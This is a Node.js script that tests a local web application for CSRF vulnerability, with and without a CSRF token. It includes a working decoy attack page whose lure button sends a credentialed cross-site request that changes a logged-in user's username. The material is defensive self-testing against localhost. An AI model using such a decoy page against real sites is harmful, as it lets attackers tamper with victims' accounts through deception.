const axios = require("axios");
const http = require("http");

// Configuration
const BASE_URL = "http://localhost:5000";
const LOGIN_ENDPOINT = `${BASE_URL}/api/users/login`;
const CHANGE_USERNAME_ENDPOINT = `${BASE_URL}/api/users/change-username`;
const CSRF_TOKEN_ENDPOINT = `${BASE_URL}/api/users/csrf-token`;

// Test credentials
const TEST_USER = {
  username: "forming",
  password: "23456789",
};

// Function to test CSRF vulnerability (no CSRF token)
async function testCsrfVulnerability(jwtToken) {
  console.log("\n--- Testing CSRF Vulnerability (Without Protection) ---");
  try {
    // Try to change username without CSRF token
    const response = await axios.post(
      CHANGE_USERNAME_ENDPOINT,
      { username: "hacken mstexcr" },
      {
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${jwtToken}`,
        },
      }
    );

    console.log("✓ VULNERABLE: Username changed without CSRF token");
    console.log("Status:", response.status);
    console.log("Response:", response.data);
    return true;
  } catch (error) {
    if (error.response) {
      console.log("✗ NOT VULNERABLE: Request failed");
      console.log("Status:", error.response.status);
      console.log("Response:", error.response.data);
      return false;
    } else {
      console.error("Error:", error.message);
      return false;
    }
  }
}

// Function to test CSRF protection (with CSRF token)
async function testCsrfProtection(jwtToken) {
  console.log("\n--- Testing CSRF Protection ---");
  try {
    // First, get CSRF token
    const tokenResponse = await axios.get(CSRF_TOKEN_ENDPOINT, {
      headers: {
        Authorization: `Bearer ${jwtToken}`,
      },
      withCredentials: true,
    });

    const csrfToken = tokenResponse.data.csrfToken;
    console.log("Retrieved CSRF token:", csrfToken);

    // Store any cookies returned
    const cookies = tokenResponse.headers["set-cookie"];

    // Try to change username with CSRF token
    const response = await axios.post(
      CHANGE_USERNAME_ENDPOINT,
      { username: "test me ginsd" },
      {
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${jwtToken}`,
          "X-CSRF-Token": csrfToken,
          Cookie: cookies,
        },
        withCredentials: true,
      }
    );

    console.log("✓ Protected endpoint accessible with valid CSRF token");
    console.log("Status:", response.status);
    console.log("Response:", response.data);
    return true;
  } catch (error) {
    if (error.response) {
      console.log("Error with CSRF token request:");
      console.log("Status:", error.response.status);
      console.log("Response:", error.response.data);
      return false;
    } else {
      console.error("Error:", error.message);
      return false;
    }
  }
}

// Function to login and get JWT token
async function login() {
  console.log("\n--- Logging in to get JWT token ---");
  try {
    const response = await axios.post(LOGIN_ENDPOINT, TEST_USER, {
      headers: {
        "Content-Type": "application/json",
      },
    });

    console.log("✓ Login successful");
    return response.data.token;
  } catch (error) {
    if (error.response) {
      console.log("✗ Login failed");
      console.log("Status:", error.response.status);
      console.log("Response:", error.response.data);
      return null;
    } else {
      console.error("Error:", error.message);
      return null;
    }
  }
}

// Create simple HTML server to serve the attack page for manual testing
function createAttackServer() {
  const attackHtml = `
  <!DOCTYPE html>
  <html>
  <head>
      <title>Fake Website (CSRF Attack Test)</title>
      <style>
          body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
          button { padding: 10px; background: #4CAF50; color: white; border: none; cursor: pointer; }
          .hidden { display: none; }
      </style>
  </head>
  <body>
      <h1>Welcome to this innocent-looking website</h1>
      <p>This page demonstrates a CSRF attack. When you click the button below, it will attempt to change your username on the vulnerable application (if you're logged in).</p>
      
      <button id="attackButton">Click here to see cute pictures</button>
      
      <div id="result" class="hidden">
          <h2>Attack attempted!</h2>
          <p>If the application is vulnerable to CSRF, your username has been changed to hackedUser</p>
      </div>
      
      <form id="csrfForm" action="${CHANGE_USERNAME_ENDPOINT}" method="POST" style="display:none;">
          <input type="hidden" name="username" value="hackedUser">
      </form>
      
      <script>
          document.getElementById('attackButton').addEventListener('click', function() {
              // First approach: Form submission (doesn't work with JSON APIs but works with traditional form handlers)
              // document.getElementById('csrfForm').submit();
              
              // Second approach: Fetch API (modern CSRF for JSON APIs)
              fetch('${CHANGE_USERNAME_ENDPOINT}', {
                  method: 'POST',
                  headers: {
                      'Content-Type': 'application/json'
                  },
                  body: JSON.stringify({ username: 'hackedUser' }),
                  credentials: 'include' // Include cookies - this is key for the attack
              }).then(function(response) {
                  console.log('Attack response status:', response.status);
                  return response.json().catch(() => ({}));
              }).then(function(data) {
                  console.log('Attack response:', data);
              }).catch(function(error) {
                  console.error('Attack error:', error);
              });
              
              document.getElementById('result').classList.remove('hidden');
          });
      </script>
  </body>
  </html>
  `;

  const server = http.createServer((req, res) => {
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(attackHtml);
  });

  const PORT = 3000;
  server.listen(PORT, () => {
    console.log(
      `\n--- Attack test page running at http://localhost:${PORT} ---`
    );
    console.log(
      "Open this page in your browser while logged in to test the CSRF attack manually."
    );
  });
}

// Main function to run all tests
async function runTests() {
  console.log("=== CSRF VULNERABILITY TEST SCRIPT ===");

  // 1. Get JWT token by logging in
  const jwtToken = await login();
  console.log("JWT Token:", jwtToken);
  if (!jwtToken) {
    console.log("Cannot proceed with tests without JWT token");
    return;
  }

  // 2. Test if the app is vulnerable to CSRF
  const isVulnerable = await testCsrfVulnerability(jwtToken);

  // 3. Test if protection is working
  const isProtected = await testCsrfProtection(jwtToken);

  // 4. Create attack server for manual testing
  createAttackServer();

  // 5. Summary
  console.log("\n=== TEST RESULTS ===");
  console.log(
    `CSRF Vulnerability: ${isVulnerable ? "VULNERABLE" : "PROTECTED"}`
  );
  console.log(`CSRF Protection: ${isProtected ? "WORKING" : "NOT WORKING"}`);

  if (isVulnerable) {
    console.log(
      "\n⚠️ Your application appears to be vulnerable to CSRF attacks!"
    );
    console.log("Implement CSRF protection as shown in the previous examples.");
  } else if (!isProtected) {
    console.log("\n⚠️ Your CSRF protection implementation needs adjustment.");
  } else {
    console.log(
      "\n✅ Your application appears to be properly protected against CSRF attacks!"
    );
  }
}

// Run the test script
runTests();
